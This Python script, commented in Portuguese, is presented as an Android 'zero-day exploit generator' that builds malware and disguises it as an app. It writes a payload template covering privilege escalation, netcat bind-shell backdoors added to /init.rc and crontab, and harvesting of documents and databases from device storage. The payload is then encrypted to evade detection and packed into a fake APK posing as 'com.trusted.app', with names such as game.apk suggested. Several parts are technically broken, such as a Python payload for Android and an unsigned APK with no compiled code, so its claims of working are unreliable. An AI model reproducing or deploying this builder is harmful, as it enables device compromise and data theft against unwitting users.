#!/usr/bin/env python3
import os
import sys
import random
import subprocess
import zipfile
import hashlib
import json
from time import sleep
from cryptography.fernet import Fernet

# Configurações
EXPLOIT_DB = "exploits.json"  # Banco de dados de exploits conhecidos

class ZeroDayGenerator:
    def __init__(self):
        self.banner()
        self.exploits = self.load_exploits()
        self.key = Fernet.generate_key()
        self.supported_versions = self.get_supported_versions()

    def banner(self):
        """Exibe um banner estilizado"""
        print(r"""
  ______                  _____       _      _____             _             
 |___  /                 |  _  |     | |    |  __ \           | |            
    / / ___ _ __ ___  ___| | | |_   _| |__  | |  \/_ __ ___  __| | _____ _ __ 
   / / / _ \ '__/ __|/ _ \ | | | | | | '_ \ | | __| '__/ _ \/ _` |/ / _ \ '__|
./ /__  __/ |  \__ \  __/ \ \_/ / |_| | | || |_\ \ | |  __/ (_|   \  __/ |   
\_____/\___|_|  |___/\___|\___/ \__,_|_| |_|\____/_|  \___|\__,_|\_\___|_|   
                                                                              
        Android Zero-Day Exploit Generator (Supports all Android versions)
        """)

    def load_exploits(self):
        """Carrega exploits conhecidos de um arquivo JSON."""
        try:
            if os.path.exists(EXPLOIT_DB):
                with open(EXPLOIT_DB, "r") as f:
                    return json.load(f)
            return []
        except Exception as e:
            print(f"[!] Erro ao carregar exploits: {e}")
            return []

    def get_supported_versions(self):
        """Retorna todas as versões do Android suportadas (baseado no JSON)"""
        versions = set()
        for exploit in self.exploits:
            versions.add(exploit['android_version'])
        return sorted(versions, reverse=True)

    def show_supported_versions(self):
        """Mostra as versões suportadas"""
        print("\n[+] Versões do Android suportadas:")
        for i, version in enumerate(self.supported_versions, 1):
            print(f"    {i}. Android {version}")

    def select_version(self):
        """Permite ao usuário selecionar a versão do Android"""
        self.show_supported_versions()
        while True:
            try:
                choice = int(input("\n[?] Selecione a versão (1-{}): ".format(len(self.supported_versions))))
                if 1 <= choice <= len(self.supported_versions):
                    return self.supported_versions[choice-1]
                print("[!] Escolha inválida. Tente novamente.")
            except ValueError:
                print("[!] Por favor, insira um número.")

    def generate_payload(self, android_version):
        """Gera um payload baseado na versão do Android."""
        available_exploits = [exp for exp in self.exploits if exp['android_version'] == android_version]
        
        if not available_exploits:
            print(f"[!] Nenhum exploit disponível para Android {android_version}")
            return None

        exploit = random.choice(available_exploits)
        
        payload = f"""# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import base64
from time import sleep

# Exploit: {exploit['name']}
# CVE: {exploit['cve']}
# Android Version: {exploit['android_version']}
# Risk: {exploit.get('risk', 'High')}

def escalate_privileges():
    try:
        # {exploit['description']}
        {exploit['code']}
        
        # Verifica se o exploit funcionou
        if os.geteuid() == 0:
            return True
    except Exception as e:
        sys.stderr.write(f"[!] Erro: {{e}}\\n")
    return False

def persistencia():
    \"\"\"Estabelece persistência no dispositivo\"\"\"
    try:
        # Método 1: Adiciona ao init.rc
        with open("/init.rc", "a") as f:
            f.write("service backdoor /system/bin/sh -c 'while true; do nc -l -p 4444 -e /system/bin/sh; done'\\n")
        
        # Método 2: Adiciona task agendada
        os.system("echo '* * * * * root nc -l -p 5555 -e /system/bin/sh' >> /etc/crontab")
        
        return True
    except:
        return False

def data_exfiltration():
    \"\"\"Rouba dados sensíveis do dispositivo\"\"\"
    try:
        sensitive_dirs = ["/sdcard/", "/data/data/", "/system/etc/"]
        stolen_data = []
        
        for directory in sensitive_dirs:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        if file.endswith(('.txt', '.pdf', '.doc', '.db', '.xml', '.conf')):
                            filepath = os.path.join(root, file)
                            with open(filepath, "rb") as f:
                                content = base64.b64encode(f.read()).decode()
                                stolen_data.append(f"{{filepath}}::{{content}}")
        
        # Envia dados para servidor C2 (simulado)
        with open("/tmp/exfil_data.b64", "w") as f:
            f.write("\\n".join(stolen_data))
            
        return True
    except:
        return False

if __name__ == "__main__":
    print("[*] Executando exploit...")
    if escalate_privileges():
        print("[+] Privilégios elevados com sucesso!")
        
        print("[*] Estabelecendo persistência...")
        if persistencia():
            print("[+] Persistência estabelecida")
        else:
            print("[-] Falha ao estabelecer persistência")
            
        print("[*] Exfiltrando dados...")
        if data_exfiltration():
            print("[+] Dados exfiltrados com sucesso (/tmp/exfil_data.b64)")
        else:
            print("[-] Falha na exfiltração de dados")
            
        print("[+] Exploit concluído com sucesso!")
    else:
        print("[-] Falha ao escalar privilégios")
        sys.exit(1)
"""
        return payload

    def encrypt_payload(self, payload):
        """Criptografa o payload para evitar detecção."""
        cipher = Fernet(self.key)
        return cipher.encrypt(payload.encode())

    def build_apk(self, encrypted_payload, output="malicious.apk"):
        """Empacota o payload em um APK falso."""
        try:
            # Cria estrutura de diretórios temporária
            os.makedirs("temp/assets", exist_ok=True)
            os.makedirs("temp/res", exist_ok=True)
            
            # Escreve os arquivos necessários
            with open("temp/assets/payload.enc", "wb") as f:
                f.write(encrypted_payload)
                
            with open("temp/AndroidManifest.xml", "w") as f:
                f.write(self._generate_manifest())
                
            with open("temp/res/ic_launcher.png", "wb") as f:
                # Ícone padrão (pode ser substituído)
                f.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
            
            # Cria o APK
            with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as apk:
                for root, _, files in os.walk("temp"):
                    for file in files:
                        path = os.path.join(root, file)
                        apk.write(path, os.path.relpath(path, "temp"))
            
            # Limpa os arquivos temporários
            subprocess.run(["rm", "-rf", "temp"], check=True)
            
            print(f"\n[+] APK malicioso gerado com sucesso: {output}")
            print("[!] Tamanho do arquivo:", os.path.getsize(output), "bytes")
            print("[!] SHA256:", self.calculate_hash(output))
        except Exception as e:
            print(f"[!] Erro ao construir APK: {e}")
            sys.exit(1)

    def calculate_hash(self, filename):
        """Calcula o hash SHA256 do arquivo"""
        sha256 = hashlib.sha256()
        with open(filename, "rb") as f:
            while True:
                data = f.read(65536)
                if not data:
                    break
                sha256.update(data)
        return sha256.hexdigest()

    def _generate_manifest(self):
        """Gera um AndroidManifest.xml falso para o APK."""
        return """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.trusted.app"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme"
        android:allowBackup="true"
        android:usesCleartextTraffic="true">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service android:name=".BackgroundService" />
        
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
"""

if __name__ == "__main__":
    try:
        generator = ZeroDayGenerator()
        
        if not generator.exploits:
            print("[!] Nenhum exploit carregado. Verifique o arquivo exploits.json")
            sys.exit(1)
            
        selected_version = generator.select_version()
        print(f"\n[*] Selecionado: Android {selected_version}")
        
        payload = generator.generate_payload(selected_version)
        if payload:
            encrypted_payload = generator.encrypt_payload(payload)
            output_name = input("[?] Nome do arquivo de saída (ex: game.apk): ").strip() or "update.apk"
            generator.build_apk(encrypted_payload, output_name)
            
            print("\n[!] AVISO: Este script é apenas para fins educacionais e de pesquisa.")
            print("[!] Não use para atividades ilegais. O uso indevido é de sua responsabilidade.")
    except KeyboardInterrupt:
        print("\n[!] Operação cancelada pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Erro fatal: {e}")
        sys.exit(1)
